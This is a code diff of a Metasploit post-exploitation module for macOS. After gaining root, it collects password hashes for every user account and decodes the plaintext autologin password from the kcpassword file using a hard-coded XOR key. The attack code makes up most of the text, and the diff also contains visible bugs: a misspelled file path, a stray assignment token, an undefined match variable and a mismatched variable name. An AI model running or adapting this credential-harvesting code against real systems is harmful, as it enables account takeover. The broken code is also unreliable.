@@ -6,9 +6,18 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
-require 'active_support/core_ext/hash/conversions'
+require 'rexml/document'
 
 class Metasploit3 < Msf::Post
+
+  # When auto-login is enabled for some account, a kcpassword file is created
+  # that stores the password in plaintext
+  KC_PASSWORD_PATH = '/prviate/etc/kcpassword'
+  # set of files to ignore while looping over files in a directory
+  OSX_IGNORE_FILES = [".", "..", ".DS_Store"]
+  # set of accounts to ignore while pilfering data
+  OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
+
 
   include Msf::Post::File
   include Msf::Auxiliary::Report
@@ -17,12 +26,15 @@ class Metasploit3 < Msf::Post
     super( update_info( info,
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
-            This module dumps SHA-1, LM and NT Hashes of Mac OS X Tiger, Leopard, Snow Leopard and Lion Systems.
+            This module dumps SHA-1, LM, NT, SHA512, SHA512PBKDF2 Hashes on OSX. Supports versions
+            10.4 to 10.9. If any user has autologin enabled, that user's plaintext password will
+            also be collected.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
           'Carlos Perez <carlos_perez[at]darkoperator.com>',
-          'hammackj <jacob.hammack[at]hammackj.com>'
+          'hammackj <jacob.hammack[at]hammackj.com>',
+          'joev'
         ],
         'Platform'      => [ 'osx' ],
         'SessionTypes'  => [ 'shell' ]
@@ -41,22 +53,18 @@ class Metasploit3 < Msf::Post
     print_status("Running module against #{host}")
     if root?
       print_status("This session is running as root!")
-      dump_hash
+      dump_kcpassword if file_exist?(KC_PASSWORD_PATH)
+      dump_hashes
     else
       print_error("Insufficient Privileges you must be running as root to dump the hashes")
     end
   end
 
-  #parse the dslocal plist in lion
+  # parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
-    require "rexml/document"
-
     doc  = REXML::Document.new(plist_content)
     keys = []
-
-    doc.elements.each("plist/dict/key") do |element|
-      keys << element.text
-    end
+    doc.elements.each("plist/dict/key")  { |n| keys << n.text }
 
     fields = {}
     i = 0
@@ -76,6 +84,109 @@ class Metasploit3 < Msf::Post
     return fields
   end
 
+  # When user account has auto-login enabled, password is stored in /etc/kcpassword file
+  def dump_kcpassword
+    # read the autologin account from prefs plist
+    autouser = cmd_exec 'defaults read /Library/Preferences/com.apple.loginwindow "autoLoginUser" "username"'
+    if autouser.present?
+      print_status "User #{autouser} has autologin enabled, decoding password..."
+    else
+      return
+    end
+
+    kcpass = read_file(KC_PASSWORD_PATH)
+    key = [0x7D, 0x89, 0x52, 0x23, 0xD2, 0xBC, 0xDD, 0xEA, 0xA3, 0xB9, 0x1F]
+    decoded = kcpass.bytes.to_a.each_slice(key.length).map do |kc|
+      kc.each_with_index.map { |byte, idx| byte ^ key[idx] }.map(&:chr).join
+    end.join.sub(/\x00.*$/, '')
+    report_auth_info(
+      :host   => host,
+      :port   => 445,
+      :sname  => 'login',
+      :user   => autouser,
+      :pass   => decoded,
+      :active => true
+    )
+    print_good "Decoded autologin password: #{autouser}:#{decoded}"
+  end
+
+  # Dump SHA1/SHA512/SHA512PBKDF2 Hashes used by OSX, must be root to get the Hashes
+  def dump_hashes
+    hash_file = ''
+    users.each do |user|
+      if gte_lion?
+        # Look for the user's specific profile.plist, which contains ShadowHashData key
+        plist_bytes = cmd_exec("sudo dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
+        # ShadowHashData stores a binary plist inside of the user.plist
+        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
+        plist_bytes = $1.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+        # encode the bytes as \x hex string, print using zsh, and pass to plutil
+        shadow_plist = cmd_exec("/bin/zsh -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")= 
+        # read the plaintext xml
+        shadow_xml = REXML::Document.new(shadow_plist)
+        # parse out the different parts of sha512pbkdf2
+        dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
+        entropy = dict.elements[2].text.gsub(/\s+/, '')
+        iterations = dict.elements[4].text.gsub(/\s+/, '')
+        salt = dict.elements[6].text.gsub(/\s+/, '')
+
+        # Report the hash bytes
+        hash = "SHA512PBKDF2:entropy:#{user}:#{entropy}\n" +
+               "SHA512PBKDF2:iterations:#{user}:#{iterations}\n" +
+               "SHA512PBKDF2:salt:#{user}:#{salt}"
+        hash.split("\n").each { |line| print_good line }
+        hash_file << hash
+      else
+        guid = if gte_leopard?
+          cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
+        elsif lte_tiger?
+          cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
+        end
+
+        # Extract the hashes
+        sha1_hash = read_file("/var/db/shadow/hash/#{guid} | cut -c169-216").chomp
+        nt_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c1-32").chomp
+        lm_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c33-64").chomp
+
+        # Check that we have the hashes and save them
+        if sha1_hash !~ /00000000000000000000000000000000/
+          print_status("SHA1:#{user}:#{sha1_hash}")
+          hash_file << "#{user}:#{sha1_hash}"
+        end
+
+        if nt_hash !~ /000000000000000/
+          print_status("NT:#{user}:#{nt_hash}")
+          print_status("Credential saved in database.")
+          report_auth_info(
+            :host   => host,
+            :port   => 445,
+            :sname  => 'smb',
+            :user   => user,
+            :pass   => "AAD3B435B51404EE:#{nt_hash}",
+            :active => true
+          )
+        end
+        if lm_hash !~ /0000000000000/
+          print_status("LM:#{user}:#{lm_hash}")
+          print_status("Credential saved in database.")
+          report_auth_info(
+            :host   => host,
+            :port   => 445,
+            :sname  => 'smb',
+            :user   => user,
+            :pass   => "#{lm_hash}:",
+            :active => true
+          )
+        end
+      end
+    end
+    # Save pwd file
+    upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file,
+                        "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
+    print_good("Unshadowed Password File: #{upassf}")
+  end
+
+
   # Checks if running as root on the target
   # @return [Bool] current user is root
   def root?
@@ -92,138 +203,23 @@ class Metasploit3 < Msf::Post
     @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
   end
 
-  # Dump SHA1 Hashes used by OSX, must be root to get the Hashes
-  def dump_hash
-    print_status("Dumping Hashes")
-    host = session.session_host
-
-    # Path to files with hashes
-    sha1_file = ""
-
-    # Check if system is Lion if not continue
-    if ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
-      hash_decoded = ""
-
-      # get list of profiles present in the box
-      profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
-
-      if profiles
-        profiles.each do |profile|
-          # Skip none user profiles
-          next if profile =~ /^_/
-          next if profile =~ /^daemon|nobody/
-
-          # Turn profile plist in to XML format
-          plist = "/private/var/db/dslocal/nodes/Default/users/#{profile.chomp}"
-          store_loot("osx.users.#{profile}", "text/plain", session, read_file(plist), "#{profile}.plist")
-
-          data = cmd_exec("defaults read #{plist} ShadowHashData")
-
-          if data.gsub(/\s+/, '') =~ /\(<(.+)>\)/
-            data = $1
-          else
-            next
-          end
-
-          data.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
-          shadow = cmd_exec("/bin/sh -c echo -ne \"#{echo_cmd}\" | plutil -convert xml1 - -o -")
-          # h = Hash.from_xml(data)
-          require 'pry'; binding.pry
-
-          print_status("SHA512:#{profile}:#{sha512}")
-          sha1_file << "#{profile}:#{sha512}\n"
-
-          if nt_hash
-            print_status("NT:#{user}:#{nt_hash}")
-            print_status("Credential saved in database.")
-            report_auth_info(
-              :host   => host,
-              :port   => 445,
-              :sname  => 'smb',
-              :user   => user,
-              :pass   => "AAD3B435B51404EE:#{nt_hash}",
-              :active => true
-            )
-
-            # Reset hash value
-            nt_hash = nil
-          end
-          # Reset hash value
-          hash_decoded = ""
-        end
-      end
-      # Save pwd file
-      upassf = store_loot("osx.hashes.sha512", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA512 Password File")
-
-      # If system was lion and it was processed nothing more to do
-      return
-    end
-
-    # Process each user
-    users.each do |user|
-      if leopard?
-        guid = cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-      elsif tiger?
-        guid = cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
-      end
-
-      # Extract the hashes
-      sha1_hash = read_file("/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
-      nt_hash   = read_file("/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
-      lm_hash   = read_file("/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
-
-      # Check that we have the hashes and save them
-      if sha1_hash !~ /00000000000000000000000000000000/
-        print_status("SHA1:#{user}:#{sha1_hash}")
-        sha1_file << "#{user}:#{sha1_hash}"
-      end
-
-      if nt_hash !~ /000000000000000/
-        print_status("NT:#{user}:#{nt_hash}")
-        print_status("Credential saved in database.")
-        report_auth_info(
-          :host   => host,
-          :port   => 445,
-          :sname  => 'smb',
-          :user   => user,
-          :pass   => "AAD3B435B51404EE:#{nt_hash}",
-          :active => true
-        )
-      end
-      if lm_hash !~ /0000000000000/
-        print_status("LM:#{user}:#{lm_hash}")
-        print_status("Credential saved in database.")
-        report_auth_info(
-          :host   => host,
-          :port   => 445,
-          :sname  => 'smb',
-          :user   => user,
-          :pass   => "#{lm_hash}:",
-          :active => true
-        )
-      end
-    end
-    # Save pwd file
-    upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file, "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
-    print_good("Unshadowed Password File: #{upassf}")
-  end
-
-
   # @return [Bool] system version is at least 10.7
-  def lion?
+  def gte_lion?
     ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
   end
 
-
   # @return [Bool] system version is at least 10.5
-  def leopard?
+  def gte_leopard?
     ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
   end
 
-  
   # @return [Bool] system version is 10.4 or lower
-  def tiger?
+  def lte_tiger?
     ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
   end
 
+  # @return [Array<String>] list of user names
+  def users
+    @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
+  end
 end
